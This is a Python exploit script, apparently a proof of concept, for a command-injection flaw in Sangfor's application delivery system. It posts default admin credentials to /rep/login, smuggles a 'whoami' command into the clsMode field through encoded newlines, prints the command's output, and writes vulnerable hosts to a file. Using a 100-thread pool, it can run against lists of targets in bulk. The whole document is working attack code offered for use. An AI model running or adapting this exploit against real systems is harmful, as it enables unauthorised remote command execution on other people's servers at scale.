import argparse,requests,sys,time,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'
def banner():
    text="""       ____.__            ____.__        
    |    |__| ____     |    |__| ____  
    |    |  |/ __ \    |    |  |/ __ \ 
/\__|    |  \  ___//\__|    |  \  ___/ 
\________|__|\___  >________|__|\___  >
                 \/                 \/ 

     
writer:杰杰宝贝
"""
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description='Sangfor application delivery system command execution vulnerability')
    parser.add_argument('-u','--url',dest='url',type=str,help="your one url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file name ')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        urllist = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                urllist.append(url.strip())
        mp = Pool(100)
        mp.map(poc,urllist)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    try:
        payload = "/rep/login"
        headers = {
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
            'Accept-Encoding':'gzip, deflate',
            'Content-Type':'application/x-www-form-urlencoded',
            'Content-Length':'102',
        }
        data = "userID=admin&userPsw=admin&page=login&log_type=report&index=index&clsMode=cls_mode_login%0Awhoami%0A"
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False)
        match = re.search(r'\|(.*?)$',res.text)
        # print(match.group(0))
        # print(res.text)
        if 'API-CT_SYS_FAIL_LIST' in res.text:
            print(f"{GREEN}[+]{target}---There is a command execution vulnerability{RESET}")
            print(f"{GREEN}[+]{target}---命令执行结果为：{match.group(0)}{RESET}")
            with open ('sx.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target}---There is no command execution vulnerability")
    except Exception as e:
        print(f"{target}There is a problem with your website, please test it manually")
        print(f"error message: {str(e)}")

        
if __name__ == '__main__' :
    main()